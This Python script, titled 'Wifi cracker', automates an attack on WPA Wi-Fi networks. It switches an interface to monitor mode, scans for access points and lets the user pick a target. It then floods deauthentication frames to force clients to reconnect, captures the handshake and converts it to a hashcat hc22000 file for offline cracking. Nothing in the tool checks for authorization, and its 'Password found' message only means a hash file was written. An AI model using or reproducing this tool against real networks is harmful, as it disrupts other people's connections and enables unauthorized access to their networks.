import subprocess as sub
import glob
import time
from colorama import Fore
import pyfiglet
import re


def check_tool():
    tool_names = ["xterm", "aircrack-ng", "hcxpcapngtool"]
    for tool in tool_names:
        time.sleep(0.5)
        try:
            sub.run(["which", tool], check=True)
            print(Fore.BLUE + f"{tool} is installed\n")
        except sub.CalledProcessError:
            print(Fore.RED + f"{tool} is not installed\n")
            decision = input(Fore.YELLOW + f"Do you want install {tool}: (YES - y ||| NO - n): ")
            if tool == "hcxpcapngtool":
                tool = "hcxtools"
            if decision == "y":
                dowload = sub.Popen(["apt", "install", tool])
                dowload.wait()
                print(Fore.GREEN + f"{tool} is installed\n")



def set_monitor_mode(interface):
    process = sub.run(["iwconfig"], stdout=sub.PIPE)
    print(process.stdout.decode())
    result= process.stdout.decode()

    if "Mon" in result:
        print(Fore.GREEN + "\ninterface already in monitor mode")
        time.sleep(1)
        return interface
    else:
        sub.call(["airmon-ng","start",interface],stdout= sub.PIPE)
        process2 = sub.run(["iwconfig"], stdout=sub.PIPE)
        process = sub.run(["ifconfig"], stdout=sub.PIPE)
        result2 = process2.stdout.decode()
        result = process.stdout.decode()
        pattern = r'^(\w+):'
        final = re.findall(pattern, result, re.MULTILINE)
        if "Mon" in result2:
            print(Fore.GREEN + "\nInterface switched to monitor mode")
            time.sleep(1)
            for i in final:
                if "mon" in i:
                    a=1
                    break
                else:
                    a=0
            if a==1:
                return interface + "mon"
            else:
                return interface
        else:
            print(Fore.RED + "\nFailed to switch to interface monitor mode")

def scan_wifi(mon_interface):
    print(Fore.YELLOW + "\nCtrl+c for stop scan")
    time.sleep(2)
    proces = sub.Popen(["airodump-ng", mon_interface, "-w", "output"])
    try:
        proces.wait()
    except:
        print(Fore.GREEN + "\nScan ended")


def select_wifi():
    output_file = "output-01.csv"

    total_wifi_number = 0

    bssid_list = []
    ssid_list = []
    channel_list = []
    print(Fore.YELLOW + f"\n  \tNAME\t\t\t CHANNEL\t\tESSID")
    with open(output_file, "r") as file:
        for line in file:
            if "Station" in line:
                break
            else:
                match_bssid = re.search(r"(\w\w:\w\w:\w\w:\w\w:\w\w:\w\w)", line)
                match_channel = re.search(r"\d\d:\d\d:\d\d,\s(..),", line)
                match_ssid = re.search(r"([^,]+),\s+$", line)
                if match_bssid and match_channel and match_ssid:
                    bssid_list.append(match_bssid.group(1))
                    channel_list.append(match_channel.group(1))
                    ssid_list.append(match_ssid.group(1))
                    print(Fore.RED + f"\n{total_wifi_number+1}) {bssid_list[total_wifi_number]}\t\t\t{channel_list[total_wifi_number]}\t\t{ssid_list[total_wifi_number]}")
                    total_wifi_number += 1
    files = glob.glob("output-01.*")
    for file in files:
        sub.Popen(["rm", file])
    while True:
        choose = int(input(Fore.GREEN + f"\nSelect the target number: "))
        if choose <= total_wifi_number:
            break
        else:
            print(Fore.RED + f"\nPlease enter the possible number")

    return bssid_list[choose-1],channel_list[choose-1]




def scan_target(bssid, channel, mon_interface, name,zaman):

    airodump_process = sub.Popen(["xterm", "-geometry", "100x60+100+100", "-e", "airodump-ng", "--bssid", bssid, "--channel", channel, "--write", name, mon_interface])
    time.sleep(3)
    aireplay_process = sub.Popen(["xterm","-geometry", "100x60+800+100", "-e", "aireplay-ng", "--deauth", "15", "-a", bssid, mon_interface])
    aireplay_process.wait()

    try:
        airodump_process.wait(timeout=zaman)
    except sub.TimeoutExpired:
        airodump_process.kill()


def convert(name):
    filenames = glob.glob(name + "*.cap")

    if filenames:
        for filename in filenames:
            with open("/dev/null", "w") as devnull:
                sub.Popen(["hcxpcapngtool", filename, "-o", f"{name}.hc22000"], stdout=devnull, stderr=devnull)
    else:
        print(Fore.RED + "\nNo matching files found.")

    file1 = glob.glob(name+"*.csv")
    file2 = glob.glob(name+"*.netxml")
    file3 = glob.glob(name+"*cap")
    delete_files = file1 + file2 + file3
    for filename in delete_files:
        sub.Popen(["rm", filename])




def checking(name):
    time.sleep(1.5)
    if glob.glob(name + ".hc22000"):
        print(Fore.GREEN + "\nPassword found ---->> " + name + ".hc22000")
        return 0
    else:
        print(Fore.RED + "\nPassword not found")
        if input(Fore.YELLOW + "\nDo you want try again (yes - y ||| no- n): ") == "y":
            return 1
        else:
            return 0



def managed_mode(mon_interface):
    managed = sub.Popen(["airmon-ng", "stop", mon_interface])
    managed.wait()
    print(Fore.GREEN + "\nSwitched to interface managed mode")
    print(pyfiglet.figlet_format("END"))

#START
print(pyfiglet.figlet_format("W i f i \n c r a c k e r\n"))
check_tool()


print(Fore.YELLOW+ f"\t\tTOOL STARTING\n")
time.sleep(0.5)
result = sub.run(["iwconfig"],stdout=sub.PIPE)
print(result.stdout.decode())
interface = input(Fore.GREEN + "\nEnter the interface name (wlan0) : ")

mon_interface = set_monitor_mode(interface)
scan_wifi(mon_interface)
bssid = 0
channel = 0

bssid, channel = select_wifi()
bssid = bssid.strip()
channel = channel.strip()



while True:
    try:
        zaman = int(input(Fore.GREEN + "\nEnter time for capture handshake (best is 20-30): "))
        break
    except:
        print(Fore.RED + "\nPlease enter the number")

name= input(Fore.GREEN + "\nEnter file name : ")

while True:
    scan_target(bssid, channel, mon_interface, name, zaman)
    convert(name)
    print(Fore.GREEN + "\nProcess ended")
    if checking(name) == 0:
        break

if input(Fore.YELLOW + "\nSwitch to interface managed mode? ( yes-y || No-n ): ") == "y":
    managed_mode(mon_interface)
